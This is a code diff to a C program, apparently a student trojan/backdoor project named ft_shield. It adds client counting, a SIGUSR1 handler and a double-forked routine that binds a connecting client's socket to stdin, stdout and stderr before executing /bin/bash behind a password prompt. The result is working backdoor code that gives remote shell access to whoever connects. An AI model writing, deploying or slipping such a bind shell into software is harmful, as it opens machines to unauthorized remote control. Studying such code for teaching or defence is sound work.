@@ -1,5 +1,7 @@
 #include "ft_shield.h"
 
+int nb_clients = 0;
+
 // Return 64-bit FNV-1a hash for a given password. See:
 // https://en.wikipedia.org/wiki/Fowler–Noll–Vo_hash_function
 static uint64_t fnv1a(const char* key) {
@@ -9,6 +11,12 @@ static uint64_t fnv1a(const char* key) {
         hash *= FNV_PRIME;
     }
     return hash;
+}
+
+void sig_handler(int code) {
+	if (code == SIGUSR1) {
+		nb_clients--;
+	}
 }
 
 char *clean_join(char *s1, char *s2) {
@@ -46,18 +54,20 @@ char *readline(int fd) {
 }
 
 void sh(Client *client, int epollfd, struct epoll_event *ev) {
-	int pid = fork();
+	int pid = getpid();
+	if (!fork()) {
+		int pid_child = fork();
+		if (!pid_child) {
+			dup2(client->fd, 0);
+			dup2(client->fd, 1);
+			dup2(client->fd, 2);
 
-	if (!pid) {
-		dup2(client->fd, 0);
-		dup2(client->fd, 1);
-		dup2(client->fd, 2);
-
-		execve("/bin/bash", (char*[]){"/bin/sh", NULL}, NULL);
-		disconnect_client(client, epollfd, ev);
-	} else {
-		wait(NULL);
-		disconnect_client(client, epollfd, ev);
+			execve("/bin/bash", (char*[]){"/bin/sh", NULL}, NULL);
+		} else {
+			waitpid(pid_child, NULL, 0);
+			kill(pid, SIGUSR1);
+			disconnect_client(client, epollfd, ev);
+		}
 	}
 }
 
@@ -75,6 +85,7 @@ int main() {
 	Client clients[MAX_CLIENTS] = {};
 
 	bool shell = false;
+	signal(SIGUSR1, sig_handler);
 
 	init_clients(clients);
 	int sock = init_socket(&addr);
@@ -105,8 +116,13 @@ int main() {
 		for (int n = 0; n < nfds; n++) {
 			int fd = events[n].data.fd;
 			if (fd == sock) {
+				if (nb_clients >= MAX_CLIENTS) {
+					refuse_client(sock, epollfd, &addr, &ev);
+					continue;
+				}
 				int newfd = new_connection(sock, epollfd, &addr, &ev);
 				add_client(clients, newfd);
+				nb_clients++;
 				putstr(newfd, "Password: ");
 			} else {
 				Client *client = get_client(clients, events[n].data.fd);
